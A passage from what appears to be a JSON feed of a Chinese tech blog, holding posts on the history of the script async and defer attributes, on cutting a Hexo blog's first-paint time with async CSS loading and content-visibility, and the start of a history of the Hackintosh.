要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a 